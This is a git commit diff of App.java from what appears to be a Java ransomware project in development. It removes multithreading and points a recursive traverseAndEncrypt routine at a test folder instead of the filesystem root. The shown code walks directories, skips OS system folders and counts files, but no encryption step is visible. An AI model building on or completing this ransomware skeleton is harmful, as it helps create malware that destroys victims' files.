a861c438b26bf66279ab1f4b562d20c4b880d7b6
ISO53 <102249575+ISO53@users.noreply.github.com>
2023-12-04 16:10:08 +0300

    multithread file traversal removed
    multithread file traversal removed for faster traverse.

--- App.java
+++ App.java
@@ -1,22 +1,17 @@
 import java.io.File;
 import java.nio.file.Path;
 import java.util.HashSet;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
 
 class App {
 
-    private static final String ROOT_PATH = "/";
+    private static final String ROOT_PATH = "C:\\Users\\termi\\Desktop\\Ransomware Trial";
+
     private static int CURR_OS;
-    private static HashSet<String> CURR_OS_EXCLUDED_FOLDERS;
-    private static int NUM_OF_THREADS;
-    private static ExecutorService executorService;
     private static int count = 0;
+    private static HashSet<String> CURR_OS_EXCLUDED_FOLDERS;
 
     public static void main(String[] args) {
         CURR_OS = OS.WINDOWS;
-        NUM_OF_THREADS = 750;
-        executorService = Executors.newFixedThreadPool(NUM_OF_THREADS);
         CURR_OS_EXCLUDED_FOLDERS = CURR_OS == OS.WINDOWS ? OS.Windows.getExcludedFolders() : OS.Linux.getExcludedFolders();
         traverseAndEncrypt(new File(ROOT_PATH).listFiles());
     }
@@ -29,12 +24,12 @@ class App {
         for (File file : files) {
             if (file.isDirectory()) {
                     if (!CURR_OS_EXCLUDED_FOLDERS.contains(file.getName().toLowerCase())) {
-                        //System.out.println("Directory: " + file.getAbsolutePath());
+                        // System.out.println("Directory: " + file.getAbsolutePath());
                         traverseAndEncrypt(file.listFiles());
                     }
             } else {
                 System.out.println(count++);
-                //System.out.println("File: " + file.getAbsolutePath());
+                // System.out.println("File: " + file.getAbsolutePath());
             }
         }
     }
